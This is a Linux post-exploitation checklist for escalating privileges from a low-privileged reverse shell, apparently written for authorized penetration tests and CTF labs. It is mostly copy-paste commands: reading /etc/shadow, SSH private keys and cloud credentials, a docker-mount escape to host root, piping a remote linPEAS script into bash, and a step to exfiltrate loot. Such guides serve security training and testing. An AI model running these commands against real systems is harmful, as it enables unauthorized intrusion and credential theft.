# Post Reverse Shell Privilege Escalation Checklist

> **Purpose**: A practical, methodical checklist for Linux privilege escalation after obtaining an initial low-privileged reverse shell.  
> **Scope**: Focused on common, high-impact enumeration and escalation vectors (userland first).  
> **Usage Tips**:
> - All commands are formatted in `inline code` or fenced ```bash blocks for easy copy-paste.
> - **Local (attacker)** commands are explicitly noted — everything else runs on the **target**.
> - Cross-reference **SUID**, **sudo**, and **capabilities** findings with [GTFOBins](https://gtfobins.github.io/).
> - Broad `find` commands can be noisy/slow — scope them (e.g. `/usr /opt /home /var/www`) when possible.
> - Prefer non-destructive enumeration. Verify automated tool output manually.
> - Document everything (screenshots of `id`, flags, proof-of-concept).

---

## 1. Shell Stabilization

Obtain a proper interactive TTY. This is the foundation for everything that follows.

- [ ] Spawn a PTY in the remote shell:

  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```

  **Alternative** (if Python unavailable or issues):

  ```bash
  script /dev/null -c bash
  ```

- [ ] Background the shell: Press `Ctrl + Z` (suspends the process back to your listener on the attacker machine).

- [ ] On your **local attacker terminal** (where `nc`, `rlwrap`, or listener is running), run:

  ```bash
  stty raw -echo; fg
  ```

  This puts your local terminal into raw mode (no local echo) and brings the suspended remote shell back into the foreground.

- [ ] Back in the **remote** shell, configure terminal size and type. First, on your **local** terminal run `stty size` to get the correct values, then:

  ```bash
  stty rows <ROWS> columns <COLUMNS>
  export TERM=xterm-256color
  ```

  **Test**: `clear`, arrow keys, tab completion, and `ls --color=auto` should now work properly.

---

## 2. Situational Awareness

Build a mental model of the target: who you are, what the machine is, and who else is around.

- [ ] Current identity and group membership:

  ```bash
  id
  whoami
  groups
  ```

- [ ] Hostname, kernel, and OS details (critical for exploit selection):

  ```bash
  hostname
  uname -a
  cat /etc/os-release
  cat /proc/version
  cat /proc/cmdline
  ```

- [ ] Network layout (interfaces, routes, DNS — useful for lateral movement awareness):

  ```bash
  ip -br addr
  ip route
  cat /etc/hosts
  cat /etc/resolv.conf
  ```

- [ ] Currently logged-in users and recent logins:

  ```bash
  w
  who
  last -n 20
  lastb -n 10 2>/dev/null   # failed logins (if readable)
  ```

- [ ] All local users and groups:

  ```bash
  cat /etc/passwd
  cat /etc/group
  getent passwd 2>/dev/null
  ```

---

## 3. Environment, PATH & History

Environment variables and PATH are frequent sources of easy wins (hijacking, credential leakage).

- [ ] Dump full environment:

  ```bash
  env
  printenv
  set
  ```

- [ ] Analyze PATH for hijacking opportunities (writable directories early in PATH or `.` present):

  ```bash
  echo $PATH | tr ':' '\n'
  # Quick check of common early PATH directories
  ls -ld /usr/local/bin /usr/local/sbin /opt/bin /usr/local/games 2>/dev/null
  ```

- [ ] Check for dangerous/hijackable environment variables:

  ```bash
  env | grep -E '^(LD_LIBRARY_PATH|LD_PRELOAD|PYTHONPATH|PERL5LIB|RUBYLIB)='
  ```

- [ ] Shell history (current user + any readable histories from other users):

  ```bash
  cat ~/.bash_history ~/.zsh_history 2>/dev/null | tail -30
  find /home -name ".bash_history" -o -name ".zsh_history" 2>/dev/null | head -10
  ```

---

## 4. Sudo

- [ ] What can the current user run as root via sudo?

  ```bash
  sudo -l
  ```

- [ ] Sudo version (check for known CVEs / bypasses):

  ```bash
  sudo --version
  ```

- [ ] Review every entry against GTFOBins. Common easy wins: `vi`, `vim`, `python`, `python3`, `find`, `less`, `more`, `man`, `nmap`, `tcpdump`, `git`, `awk`, `perl`, `ruby`, `env`, `bash`, `sh`.

---

## 5. SUID / SGID Binaries

Binaries that execute with the privileges of their owner (frequently root) or group.

- [ ] Find SUID binaries (focus on root-owned):

  ```bash
  find / -perm -4000 -type f -user root 2>/dev/null
  # Faster scoped version (recommended first pass):
  # find /usr /bin /sbin /opt /libexec -perm -4000 -type f 2>/dev/null
  ```

- [ ] Find SGID binaries:

  ```bash
  find / -perm -2000 -type f 2>/dev/null
  ```

- [ ] **Action**: Cross-reference **every** binary found with GTFOBins for exploitation steps. Many have ready-made one-liners.

---

## 6. Linux Capabilities

Capabilities can grant specific root-like privileges to binaries without full SUID.

- [ ] Enumerate binaries with capabilities:

  ```bash
  getcap -r / 2>/dev/null | grep -vE '^/(proc|sys|dev|run)'
  # Scoped (faster, less noise):
  getcap -r /usr/bin /usr/sbin /bin /sbin /opt 2>/dev/null
  ```

- [ ] Dangerous capabilities to look for (especially `+ep`):

  - `cap_setuid`
  - `cap_setgid`
  - `cap_dac_override`
  - `cap_net_admin`
  - `cap_sys_admin`
  - `cap_sys_ptrace`
  - `cap_sys_module`

  These frequently allow easy privilege escalation (e.g. spawning a root shell via Python or a small C binary).

---

## 7. Cron Jobs & Systemd Timers

Scheduled tasks running as root (or other high-privileged users) are classic privesc vectors.

- [ ] System crontabs and directories:

  ```bash
  cat /etc/crontab
  ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
  cat /etc/cron.d/* 2>/dev/null
  ```

- [ ] User crontabs:

  ```bash
  crontab -l
  ls -la /var/spool/cron/crontabs/ 2>/dev/null
  cat /var/spool/cron/crontabs/* 2>/dev/null
  ```

- [ ] Systemd timers (very common on modern systems — often missed):

  ```bash
  systemctl list-timers --all
  systemctl list-unit-files --type=timer
  systemctl list-unit-files --type=timer | grep enabled
  ```

- [ ] Real-time monitoring of process execution (catches short-lived cron/timer jobs):

  ```bash
  # Best tool: pspy (upload from attacker)
  # https://github.com/DominicBreuker/pspy/releases/latest
  ./pspy64 -pf -i 1500
  # Fallback (noisy but useful)
  watch -n 1 'ps aux | grep -E "(cron|systemd|timer)"'
  ```

- [ ] Find writable scripts called by cron/timers:

  ```bash
  find /etc/cron.* /var/spool/cron -writable -type f 2>/dev/null
  ```

---

## 8. Writable Files & Directories

World-writable files/directories can be overwritten, used for library injection, PATH hijacking, or cron/script tampering.

- [ ] World-writable files (exclude noisy virtual filesystems):

  ```bash
  find / -writable -type f ! -path '/proc/*' ! -path '/sys/*' ! -path '/dev/*' ! -path '/run/*' 2>/dev/null | head -30
  ```

- [ ] World-writable directories (potential injection points):

  ```bash
  find / -writable -type d ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -20
  ```

- [ ] Quick sanity check on critical authentication files:

  ```bash
  ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/group /etc/ssh/sshd_config
  ```

  **Any of these writable by your user = game over (instant root or persistence).**

---

## 9. Interesting Files & Credentials

Hunt for hardcoded credentials, keys, tokens, and configuration files that leak secrets.

- [ ] Configuration and environment files:

  ```bash
  find / -name "*.conf" -o -name "*.env*" -o -name "*.ini" -o -name "*.cfg" -o -name "*.properties" 2>/dev/null | grep -vE '(/proc|/sys|/dev)' | head -40
  ```

- [ ] Database files:

  ```bash
  find / -name "*.db" -o -name "*.sqlite*" -o -name "*.sql" -o -name "*.dump" 2>/dev/null | head -15
  ```

- [ ] SSH keys and authentication material:

  ```bash
  find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
  find / -name "authorized_keys" -o -name "known_hosts" 2>/dev/null
  cat ~/.ssh/authorized_keys 2>/dev/null
  ```

- [ ] Cloud & application credentials (if environment suggests cloud or specific apps):

  ```bash
  find /root /home -path '*/.aws/*' -o -path '*/.config/gcloud/*' -o -path '*/.azure/*' 2>/dev/null
  cat ~/.aws/credentials 2>/dev/null
  cat ~/.netrc 2>/dev/null
  ```

- [ ] Targeted credential grep (be selective — broad greps are slow):

  ```bash
  grep -r --include="*.conf" --include="*.env" --include="*.ini" "password\|secret\|key\|token" /etc /opt /var/www /home 2>/dev/null | head -20
  ```

---

## 10. Running Processes, Services & Network

Understand what is currently executing and exposed.

- [ ] Running processes (focus on root-owned and interesting binaries):

  ```bash
  ps aux
  ps -ef
  ps aux | grep -E 'root|httpd|apache|nginx|mysql|postgres|docker'
  ```

- [ ] Listening ports and owning processes (look for internal-only services):

  ```bash
  ss -tulnpe
  # Legacy fallback
  netstat -tulnpe 2>/dev/null
  ```

- [ ] Enabled and running systemd services:

  ```bash
  systemctl list-unit-files --type=service | grep -E 'enabled|static'
  systemctl list-units --type=service --state=running
  ```

---

## 11. Installed Software & Versions

Outdated packages are frequent sources of privilege escalation (especially via GTFOBins or known CVEs).

- [ ] Debian / Ubuntu package list:

  ```bash
  dpkg -l | grep '^ii' | awk '{print $2, $3}' | column -t
  ```

- [ ] RHEL / CentOS / Fedora / AlmaLinux:

  ```bash
  rpm -qa --qf '%{NAME}-%{VERSION}-%{RELEASE}\n' | sort
  ```

- [ ] Check for exploit suggester tools locally:

  ```bash
  which searchsploit exploitdb 2>/dev/null || echo "[!] searchsploit not found"
  which linux-exploit-suggester 2>/dev/null || echo "[!] linux-exploit-suggester not found"
  ```

- [ ] Available interpreters and compilers (for exploit development or GTFOBins):

  ```bash
  which python python2 python3 perl ruby php gcc g++ make wget curl nc ncat socat
  ```

---

## 12. Kernel Exploits (Use as Last Resort Only)

Kernel exploits are powerful but risky.

- [ ] Kernel version and distribution details:

  ```bash
  uname -r
  uname -a
  cat /etc/os-release
  ```

- [ ] Research known exploits:

  - If `searchsploit` is available: `searchsploit linux kernel $(uname -r)`
  - Note exact kernel version and search offline resources / exploit-db for: Dirty COW, Dirty Pipe, PwnKit, DirtyCred, etc.
  - Consider running `linux-exploit-suggester.sh` if uploaded.

- [ ] **Critical Warning**: Kernel exploits can crash the target, corrupt filesystems, or trigger detection. Only attempt when no userland path exists and the engagement explicitly permits it. Always have a revert/cleanup plan.

---

## 13. Container & Docker Checks

Determine if you are inside a container and whether escape paths exist.

- [ ] Container detection:

  ```bash
  cat /.dockerenv 2>/dev/null && echo "[+] Docker container detected"
  cat /proc/1/cgroup | grep -E 'docker|kubepods|containerd|libpod'
  ls -la /.dockerenv
  ```

- [ ] Docker group membership (easy win if present):

  ```bash
  id | grep -i docker
  groups | grep -i docker
  ```

- [ ] Docker socket permissions (extremely high value if writable by your user):

  ```bash
  ls -la /var/run/docker.sock
  ```

- [ ] Quick container escape example (if socket or docker group access confirmed):

  ```bash
  docker run -v /:/hostfs -it alpine chroot /hostfs bash
  # You are now root on the host filesystem
  ```

---

## 14. NFS Shares

Misconfigured NFS exports are a classic (and often forgotten) privesc vector.

- [ ] NFS exports and current mounts:

  ```bash
  cat /etc/exports
  showmount -e 2>/dev/null || showmount -e $(ip route | awk '/default via/ {print $3}')
  mount | grep -i nfs
  cat /etc/fstab | grep -i nfs
  ```

- [ ] **Critical finding**: `no_root_squash` in `/etc/exports` combined with a writable share usually allows trivial root access from a remote attacker (or from compromised low-priv user who can mount).

---

## 15. Automated Enumeration

Automated tools are excellent force multipliers but **never** a replacement for manual verification.

- [ ] **Primary recommendation** — linPEAS (most comprehensive, actively maintained):

  ```bash
  curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
  # Recommended: save output
  # curl ... | bash | tee linpeas_$(hostname)_$(date +%F_%H%M).log
  ```

- [ ] Lightweight / alternative tools:

  - `lse.sh` (linux-smart-enumeration) — fast and focused
  - `LinEnum.sh`
  - `linux-exploit-suggester.sh` (kernel-focused)
  - `suid3num` or custom find for SUID-only focus

- [ ] **Rule**: Always manually verify and understand any findings from automated tools. They can produce false positives/negatives and miss context.

---

## 16. Loot & Proof Collection

Gather credentials, keys, flags, and proof before exiting or pivoting. This is often when you discover secondary paths.

- [ ] Readable `/etc/shadow` (gold for offline password cracking):

  ```bash
  cat /etc/shadow 2>/dev/null | head -20
  ```

- [ ] Root SSH keys:

  ```bash
  cat /root/.ssh/id_rsa 2>/dev/null
  cat /root/.ssh/id_ed25519 2>/dev/null
  ```

- [ ] CTF / engagement proof files (common locations):

  ```bash
  cat /root/root.txt 2>/dev/null
  cat /home/*/user.txt 2>/dev/null
  find / -name "root.txt" -o -name "proof.txt" -o -name "flag.txt" 2>/dev/null | head -10
  ```

- [ ] SSH keys from all users:

  ```bash
  find /home /root -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | xargs cat 2>/dev/null
  ```

- [ ] Any other credentials, tokens, or secrets discovered during enumeration.

- [ ] Proof of successful privilege escalation:

  - Clear screenshot/output of `id` showing `uid=0(root)`
  - Any flag or proof files
  - Timestamped notes of the exact escalation path used

---

## Additional High-Value Checks (Quick Wins)

These can be performed at any time when you have spare cycles or suspect a specific vector.

- [ ] Check for writable `/etc/sudoers` or files in `/etc/sudoers.d/`:

  ```bash
  ls -la /etc/sudoers /etc/sudoers.d/
  ```

- [ ] SELinux / AppArmor status (if enforcing, some exploits are blocked):

  ```bash
  sestatus 2>/dev/null || echo "SELinux not present"
  aa-status 2>/dev/null || echo "AppArmor not present"
  getenforce 2>/dev/null
  ```

- [ ] World-readable sensitive logs or backup files:

  ```bash
  find /var/log /var/backups -name "*.log" -o -name "*.bak" -o -name "*.old" 2>/dev/null | head -10
  ```

- [ ] Git repositories (often contain hardcoded secrets or `.git/config` with credentials):

  ```bash
  find / -name ".git" -type d 2>/dev/null | head -10
  ```

---

**End of Core Checklist**

### After Obtaining Root

1. Stabilize the root shell using the same method from Section 1.
2. Re-run key enumeration commands as root (you will see much more).
3. Clean up any artifacts left behind (per Rules of Engagement).
4. Exfiltrate loot securely.
5. Pivot laterally or escalate further if scope permits.
6. Document the full attack chain with evidence for reporting.

**Remember**: The goal is controlled, authorized access improvement. Never perform actions outside the agreed scope.

---

*Improved & enhanced version — June 2026*  
*Original structure preserved and modernized with clearer commands, local vs remote distinctions, systemd timers, pspy, better find filters, cloud credential hints, container escape examples, and professional formatting.*
